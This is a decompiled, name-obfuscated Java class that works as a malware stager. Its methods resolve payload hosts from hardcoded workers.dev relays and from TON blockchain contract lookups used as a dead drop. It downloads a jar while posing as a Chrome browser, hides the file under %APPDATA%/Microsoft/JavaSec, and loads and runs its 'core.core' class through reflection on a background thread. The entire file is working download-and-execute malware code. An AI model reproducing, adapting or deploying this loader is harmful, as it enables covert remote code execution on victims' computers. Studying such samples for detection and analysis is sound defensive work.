package aurora;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.CopyOption;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class rattle {
   private static final String slipper = "https://relay-3f9c71.kartohaantoha36-6a9.workers.dev";
   private static final String ember = "https://relay-mirror.kartohaantoha36-6a9.workers.dev";
   private static final String cipher = "EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ";
   public static String laptop = "5af99dfc-41c6-451e-b4cd-22c99b9a4e9c======================================================================";
   private static final Pattern cradle = java.util.regex.Pattern.compile("\"cell\":\"([0-9a-fA-F]+)\"");

   public static void pendant(String var0, String var1, String var2) {

      new Thread(() -> {

               Iterator var3 = gadget().iterator();

               while (var3.hasNext()) {
                  String var4 = (String)var3.next();
                  Object var5 = null;

                  try {
                     PrintStream var14 = System.out;
                     String var8 = var4;
                     var14.println(new StringBuilder().append("URL: ").append(var8).toString());
                     byte[] var6 = plankton(var4);
                     if (var6 != null && var6.length != 0) {
                        var5 = rambler(var6);
                        if (var5 != null) {
                           Object var7 = new java.net.URLClassLoader(new URL[]{
                                 var5.toURI().toURL()
                              }, rattle.class.getClassLoader());
                           kayak(var7, var0, var1, var2, laptop);
                           return;
                        }

                        System.out.println("stage: bad jar");
                     }
                  } catch (Throwable var12) {
                     PrintStream var10000 = System.out;
                     String var10001 = var12.getClass().getSimpleName();
                     String var10 = var12.getMessage();
                     String var9 = var10001;
                     var10000.println(new StringBuilder().append("stage fail: ").append(var9).append(": ").append(var10).toString());
                     String var11 = var4;
                     pillar.sherbet(
                        new StringBuilder().append("Coffe/star ").append(var11).toString(),
                        var12
                     );
                  }
               }

               System.out.println("stage: all sources failed");
               pillar.mobile(
                  "Coffe/star",
                  "all payload sources failed",
                  null
               );
            }).start();
   }

   private static Object rambler(byte[] var0) {

      try {
         Object var1 = new File(System.getenv("APPDATA"), "Microsoft/JavaSec");
         var1.mkdirs();
         Object var2 = new File(var1, "stage.part");
         Object var3 = new File(var1, "stage.jar");
         Object var4 = new java.io.FileOutputStream(var2);

         try {
            var4.write(var0);
            var4.getFD().sync();
         } catch (Throwable var11) {
            try {
               var4.close();
            } catch (Throwable var10) {
               var11.addSuppressed(var10);
            }

            throw var11;
         }

         var4.close();
         if (!var2.renameTo(var3)) {
            java.nio.file.Files.copy(var2.toPath(), var3.toPath(), new CopyOption[]{
                  java.nio.file.StandardCopyOption.REPLACE_EXISTING
               });
            var2.delete();
         }

         var4 = new java.util.zip.ZipFile(var3);

         Object var5;
         label51: {
            try {
               if (var4.getEntry("core/core.class")
                  == null) {
                  var5 = null;
                  break label51;
               }
            } catch (Throwable var12) {
               try {
                  var4.close();
               } catch (Throwable var9) {
                  var12.addSuppressed(var9);
               }

               throw var12;
            }

            var4.close();
            PrintStream var15 = System.out;
            long var7 = var3.length();
            var15.println(new StringBuilder().append("stage file ").append(var7).append(" b").toString());
            return var3;
         }

         var4.close();
         return var5;
      } catch (Exception var13) {
         PrintStream var10000 = System.out;
         String var8 = var13.getMessage();
         var10000.println(new StringBuilder().append("stage write: ").append(var8).toString());
         pillar.sherbet("Coffe/writeStage", var13);
         return null;
      }
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   private static byte[] plankton(String var0) throws IOException {

      HttpURLConnection var1 = (HttpURLConnection)new URL(var0).openConnection();
      boolean var17 = false /* VF: Semaphore variable */;

      byte[] var21;
      try {
         var17 = true;
         var1.setRequestMethod("GET");
         var1.setConnectTimeout(15000);
         var1.setReadTimeout(3 << 16 | (char)-22144);
         var1.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
         var1.setRequestProperty("Accept", "*/*");
         var1.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
         var1.setRequestProperty("Accept-Encoding", "identity");
         var1.setRequestProperty("Cache-Control", "no-cache");
         var1.setRequestProperty("Pragma", "no-cache");
         int var2 = var1.getResponseCode();
         if (var2 != 200) {
            int var10 = var2;
            throw new java.io.IOException(new StringBuilder().append("HTTP ").append(var10).toString());
         }

         long var3 = var1.getContentLengthLong();
         InputStream var6 = var1.getInputStream();

         byte[] var5;
         try {
            var5 = var6.readAllBytes();
         } catch (Throwable var19) {
            if (var6 != null) {
               try {
                  var6.close();
               } catch (Throwable var18) {
                  var19.addSuppressed(var18);
               }
            }

            throw var19;
         }

         if (var6 != null) {
            var6.close();
         }

         if (var3 > 0L && var5.length != var3) {
            int var10000 = var5.length;
            long var12 = var3;
            int var11 = var10000;
            throw new java.io.IOException(new StringBuilder().append("truncated ").append(var11).append("/").append(var12).toString());
         }

         var21 = var5;
         var17 = false;
      } finally {
         if (var17) {
            var1.disconnect();
         }
      }

      var1.disconnect();
      return var21;
   }

   public static String samba() {

      try {
         String var0 = apple(8);
         String var1 = rivet(var0, 8000);
         if (var1 != null) {
            return var1;
         }
      } catch (Exception var2) {
      }

      return rivet(
               "https://relay-3f9c71.kartohaantoha36-6a9.workers.dev",
               8000
            )
            != null
         ? "https://relay-3f9c71.kartohaantoha36-6a9.workers.dev"
         : "https://relay-mirror.kartohaantoha36-6a9.workers.dev";
   }

   private static String rivet(String var0, int var1) {

      if (var0 == null) {
         return null;
      }

      for (String var5 : var0.split(",")) {
         String var6 = var5.trim();
         if (!var6.isEmpty()) {
            if (!var6.startsWith("http")) {
               String var7 = var6;
               var6 = new StringBuilder().append("https://").append(var7).toString();
            }

            while (
               var6.endsWith("/")
            ) {
               var6 = var6.substring(0, var6.length() - 1);
            }

            if (rind(var6, var1)) {
               return var6;
            }
         }
      }

      return null;
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   private static boolean rind(String var0, int var1) {

      HttpURLConnection var2 = null;
      boolean var8 = false /* VF: Semaphore variable */;

      boolean var11;
      label77: {
         try {
            var8 = true;
            var2 = (HttpURLConnection)new URL(var0).openConnection();
            var2.setRequestMethod("HEAD");
            var2.setInstanceFollowRedirects(false);
            var2.setConnectTimeout(var1);
            var2.setReadTimeout(var1);
            var2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
            int var3 = var2.getResponseCode();
            var11 = var3 > 0 && var3 < 400;
            var8 = false;
            break label77;
         } catch (Exception var9) {
            var11 = false;
            var8 = false;
         } finally {
            if (var8) {
               if (var2 != null) {
                  var2.disconnect();
               }
            }
         }

         if (var2 != null) {
            var2.disconnect();
         }

         return var11;
      }

      if (var2 != null) {
         var2.disconnect();
      }

      return var11;
   }

   private static String apple(int var0) throws Exception {

      HttpURLConnection var1 = (HttpURLConnection)new URL("https://toncenter.com/api/v2/runGetMethod").openConnection();
      var1.setRequestMethod("POST");
      var1.setDoOutput(true);
      var1.setConnectTimeout(15000);
      var1.setReadTimeout(30000);
      var1.setRequestProperty("Content-Type", "application/json");
      int var6 = var0;
      String var2 = new StringBuilder().append("{\"address\":\"EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ\",\"method\":\"link\",\"stack\":[[\"int\",\"").append(var6).append("\"]]}").toString();
      OutputStream var3 = var1.getOutputStream();

      try {
         var3.write(var2.getBytes(java.nio.charset.StandardCharsets.UTF_8));
      } catch (Throwable var8) {
         if (var3 != null) {
            try {
               var3.close();
            } catch (Throwable var7) {
               var8.addSuppressed(var7);
            }
         }

         throw var8;
      }

      if (var3 != null) {
         var3.close();
      }

      String var9 = mohair(
         var1.getInputStream()
      );
      var1.disconnect();
      Matcher var4 = java.util.regex.Pattern.compile("\"b64\":\"([A-Za-z0-9+/=]+)\"").matcher(var9);
      return var4.find()
         ? new String(java.util.Base64.getDecoder().decode(var4.group(1)), java.nio.charset.StandardCharsets.UTF_8)
         : null;
   }

   private static List<String> gadget() {

      LinkedHashSet var0 = new java.util.LinkedHashSet();

      try {
         String var7 = samba();
         String var1 = ripple(
            new StringBuilder().append(var7).append("/config").toString(),
            12000
         );
         if (var1 != null) {
            for (String var5 : new String[]{"0", "7"}) {
               var0.addAll(kingdom(canvas(var1, var5)));
            }
         }
      } catch (Exception var11) {
      }

      if (var0.isEmpty()) {
         String[] var12 = new String[]{
            "EQCsNH1LY2PQeqG2HKSk2myObNTgCuREdq1IVvZFL4k_5iia",
            "EQBaz-F9o6nHrQ16Z_jTGZShLyRNEMRtS0OWMYs0GNQK_PHA"
         };

         for (String var20 : var12) {
            try {
               String var6 = maroon(var20);
               if (var6 != null) {
                  var6 = var6.trim();
                  if (!var6.isEmpty()) {
                     if (!var6.startsWith("http")) {
                        String var8 = var6;
                        var6 = new StringBuilder().append("https://").append(var8).toString();
                     }

                     if (!var6.contains("/api/")) {
                        while (
                           var6.endsWith("/")
                        ) {
                           var6 = var6.substring(0, var6.length() - 1);
                        }

                        String var9 = var6;
                        var6 = new StringBuilder().append(var9).append("/api/hlam/files/4001").toString();
                     }

                     var0.add(var6);
                  }
               }
            } catch (Exception var10) {
            }
         }
      }

      ArrayList var13 = new java.util.ArrayList();
      Iterator var15 = var0.iterator();

      while (var15.hasNext()) {
         String var17 = (String)var15.next();
         if (!var13.contains(var17)) {
            var13.add(var17);
         }

         Iterator var19 = remark(var17).iterator();

         while (var19.hasNext()) {
            String var21 = (String)var19.next();
            if (!var13.contains(var21)) {
               var13.add(var21);
            }
         }
      }

      return var13;
   }

   private static String napkin() {

      List var0 = gadget();
      return var0.isEmpty()
         ? null
         : (String)var0.get(0);
   }

   private static List<String> kingdom(String var0) {

      ArrayList var1 = new java.util.ArrayList();
      if (var0 == null) {
         return var1;
      }

      for (String var5 : var0.split(",")) {
         String var6 = var5.trim();
         if (!var6.isEmpty()
            && var6.startsWith("http")
            && !var1.contains(var6)) {
            var1.add(var6);
         }
      }

      return var1;
   }

   private static List<String> remark(String var0) {

      ArrayList var1 = new java.util.ArrayList();

      try {
         URL var2 = new URL(var0);
         if (!var2.getHost().endsWith(".workers.dev")) {
            return var1;
         }

         String var3 = var2.getFile();

         for (String var7 : new String[]{
            "https://relay-3f9c71.kartohaantoha36-6a9.workers.dev",
            "https://relay-mirror.kartohaantoha36-6a9.workers.dev"
         }) {
            String var10 = var3;
            String var9 = var7;
            String var8 = new StringBuilder().append(var9).append(var10).toString();
            if (!var8.equals(var0)
               && !var1.contains(var8)) {
               var1.add(var8);
            }
         }
      } catch (Exception var11) {
      }

      return var1;
   }

   private static String canvas(String var0, String var1) {

      try {
         String var3 = var1;
         Matcher var2 = java.util.regex.Pattern.compile(new StringBuilder().append("\"").append(var3).append("\"\\s*:\\s*\"([^\"]+)\"").toString()).matcher(var0);
         if (var2.find()) {
            return var2.group(1);
         }
      } catch (Exception var4) {
      }

      return null;
   }

   private static String ripple(String var0, int var1) {

      try {
         HttpURLConnection var2 = (HttpURLConnection)new URL(var0).openConnection();
         var2.setRequestMethod("GET");
         var2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
         var2.setConnectTimeout(var1);
         var2.setReadTimeout(var1);
         int var3 = var2.getResponseCode();
         if (var3 != 200) {
            var2.disconnect();
            return null;
         } else {
            InputStream var4 = var2.getInputStream();
            byte[] var5 = var4.readAllBytes();
            var2.disconnect();
            return new String(var5, java.nio.charset.StandardCharsets.UTF_8);
         }
      } catch (Exception var6) {
         return null;
      }
   }

   private static void kayak(Object var0, String var1, String var2, String var3, String var4) throws ReflectiveOperationException {

      Class var5 = var0.loadClass("core.core");
      Method var6 = null;

      for (Method var10 : var5.getDeclaredMethods()) {
         Class[] var11 = var10.getParameterTypes();
         if (var11.length == 4 && var11[0] == String.class && var11[1] == String.class && var11[2] == String.class && var11[3] == String.class) {
            var6 = var10;
            break;
         }
      }

      if (var6 == null) {
         for (Method var17 : var5.getDeclaredMethods()) {
            Class[] var18 = var17.getParameterTypes();
            if (var18.length == 5
               && var18[0] == String.class
               && var18[1] == String.class
               && var18[2] == String.class
               && var18[3] == String.class
               && (
                  var18[4]
                        == Integer.TYPE
                     || var18[4] == Integer.class
               )) {
               var6 = var17;
               break;
            }
         }
      }

      if (var6 == null) {
         String var12 = var5.getName();
         throw new java.lang.NoSuchMethodException(new StringBuilder().append("No (String,String,String,String) or (String,String,String,String,int) in ").append(var12).toString());
      }

      var6.setAccessible(true);
      Object var14 = java.lang.reflect.Modifier.isStatic(var6.getModifiers())
         ? null
         : var5.getDeclaredConstructor(new Class[0]).newInstance(new Object[0]);
      if (var6.getParameterCount()
         == 4) {
         var6.invoke(var14, new Object[]{var1, var2, var3, var4});
      } else {
         var6.invoke(var14, new Object[]{
               var1,
               var2,
               var3,
               var4,
               Integer.valueOf(0)
            });
      }
   }

   private static String dragon(String var0) {

      return var0 == null
         ? ""
         : var0.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "");
   }

   private static byte[] hollow(String var0) {

      byte[] var1 = new byte[var0.length() / 2];

      for (int var2 = 0; var2 < var1.length; var2++) {
         var1[var2] = (byte)(
            java.lang.Character.digit(var0.charAt(var2 * 2), 16)
                  << 4
               | java.lang.Character.digit(var0.charAt(var2 * 2 + 1), 16)
         );
      }

      return var1;
   }

   private static long savanna(byte[] var0, int var1, int var2) {

      long var3 = 0L;

      for (int var5 = 0; var5 < var2; var5++) {
         var3 = var3 << 8 | var0[var1 + var5] & 255;
      }

      return var3;
   }

   private static String stork(String var0) {

      byte[] var1 = hollow(var0);
      int var2 = 4;
      int var3 = var1[var2++] & 255;
      int var4 = var3 & 7;
      int var5 = var1[var2++] & 255;
      int var6 = (int)savanna(var1, var2, var4);
      var2 += var4;
      int var7 = (int)savanna(var1, var2, var4);
      var2 += var4;
      var2 += var4 + var5 + var7 * var4;
      if ((var3 & 128) != 0) {
         var2 += var6 * var5;
      }

      int var18 = ++var2;
      var2++;
      int var8 = var1[var18] & 255;
      int var9 = (var8 + 1) / 2;
      return new String(var1, var2, var9, java.nio.charset.StandardCharsets.UTF_8);
   }

   private static String mohair(InputStream var0) throws IOException {

      ByteArrayOutputStream var1 = new java.io.ByteArrayOutputStream();
      byte[] var2 = new byte[8192];

      int var3;
      while ((var3 = var0.read(var2)) != -1) {
         var1.write(var2, 0, var3);
      }

      return new String(var1.toByteArray(), java.nio.charset.Charset.defaultCharset());
   }

   public static String maroon(String var0) {

      try {
         String var7 = var0;
         String var1 = new StringBuilder().append("https://tonapi.io/v2/blockchain/accounts/").append(var7).append("/methods/getMessage").toString();
         HttpURLConnection var2 = (HttpURLConnection)new URL(var1).openConnection();
         var2.setRequestMethod("GET");
         var2.setRequestProperty("Accept", "application/json");
         var2.setConnectTimeout(15000);
         var2.setReadTimeout(30000);
         int var3 = var2.getResponseCode();
         InputStream var4 = var3 >= 200 && var3 < 300
            ? var2.getInputStream()
            : var2.getErrorStream();
         String var5 = mohair(var4);
         Matcher var6 = cradle.matcher(var5);
         if (var6.find()) {
            var2.disconnect();
            return stork(
               var6.group(1)
            );
         }

         var2.disconnect();
      } catch (Exception var8) {
      }

      return null;
   }
}
